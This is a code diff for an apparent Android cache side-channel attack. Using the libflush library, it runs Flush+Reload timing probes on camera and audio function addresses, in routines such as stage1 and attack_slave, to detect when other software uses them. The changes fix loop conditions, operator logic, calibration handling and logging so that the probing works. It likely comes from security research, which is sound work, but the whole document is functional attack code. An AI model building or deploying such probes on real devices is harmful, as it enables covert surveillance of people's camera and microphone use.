@@ -56,17 +56,21 @@ void stage1(int* arr,size_t threshold, int* length_of_camera_audio, size_t* addr
     /* Initialize libflush */
     libflush_session_t *libflush_session;
     libflush_init(&libflush_session, NULL);
+    int c = 0;
+    if(threshold==9999){//if caliberation failed
+        return;
+    }
     while(*finishtrial1==0) {
         int k = 0;//index of ja
         for (int j = 0; j < 5; j++) {
-            int c = j==1?0:1;
             size_t count;
-            if(addr[j]!=0&&(j!=camera_audio[0]||j!=camera_audio[1])) {
+            if(addr[j]!=0&&(j!=camera_audio[0]&&j!=camera_audio[1])) {
                 count = libflush_reload_address_and_flush(libflush_session, addr[j]);
                 if (count <= threshold)
-                    LOGD("Target %p.", count);
+                    LOGD("Target %p.", addr[j]);
                 continue;
             }
+            c = j-1;
             for (int i = 0; i < length_of_camera_audio[c]; i++) {
                 size_t target = *((size_t *) addr[j] + i);
                 if (target == 0) {//if the target is 0, skip it.
@@ -86,6 +90,25 @@ void stage1(int* arr,size_t threshold, int* length_of_camera_audio, size_t* addr
             }
         }
     }
+
+    for(int i=1;i<3;i++){
+        c = i-1;
+        int t1 = 0;
+        int t2 = 0;
+        for (int j = 0; j < length_of_camera_audio[c]; j++) {
+            size_t target = *((size_t *) addr[i] + j);
+            if (target == 0) {//if the target is 0, skip it.
+                t1++;
+                continue;
+            }
+            t2++;
+        }
+        if(i==1)
+            LOGD("In Camera List, %d are null functions, %d are available functions.\n",t1,t2);
+        else
+            LOGD("In Audio List, %d are null functions, %d are available functions.\n",t1,t2);
+    }
+
     LOGD("Finish stage 1.\n");
     libflush_terminate(libflush_session);
 }
@@ -130,7 +153,8 @@ size_t get_threshold(){
         //fprintf(stdout, "[x] Start calibration... ");
         threshold = calibrate(libflush_session); //get the threshold
         LOGD("Currently the threshold is %d",threshold);
-
+        if(threshold==9999)
+            return threshold;
         //check if the threshold is too large
         char buffer[4096] = {0};
         void* address = &buffer[1024];
@@ -138,7 +162,7 @@ size_t get_threshold(){
         int n = 0;
         //scan a address 1 million times to check if the threshold is appropriate
         libflush_reload_address_and_flush(libflush_session,address);
-        while(n>10000000){
+        while(n<10000000){
             uint64_t count = libflush_reload_address_and_flush(libflush_session,address);
             if(count<threshold){
                 threshold -= 10;
@@ -167,7 +191,7 @@ static void attack_slave(libflush_session_t* libflush_session, pthread_mutex_t *
     int turns = 0;
     int length = compiler_position+1;
     LOGD("[x] start scaning %d",compiler_position);
-    while(continueRun){
+    while(*continueRun){
       // if the turns reached 10000 or the same offset was hit more than many times repetitively, shrink the list;
         if(turns>=100000){
 	        LOGD("Turns %d",turns);
@@ -185,7 +209,8 @@ static void attack_slave(libflush_session_t* libflush_session, pthread_mutex_t *
                 for(int i=0;i<length_of_camera_audio[c];i++) {
                     //load the address into cache to count the time, and then flush out
                     //LOGD("11111111111111111 %d",i);
-                    if(*((size_t *)addr[crt_ofs] + i)==0) continue;
+                    if(*((size_t *)addr[crt_ofs] + i)==0)
+                        continue;
                     count = libflush_reload_address_and_flush(libflush_session,
                                                               *((size_t *)addr[crt_ofs] + i));
                     if (count <= threshold) {
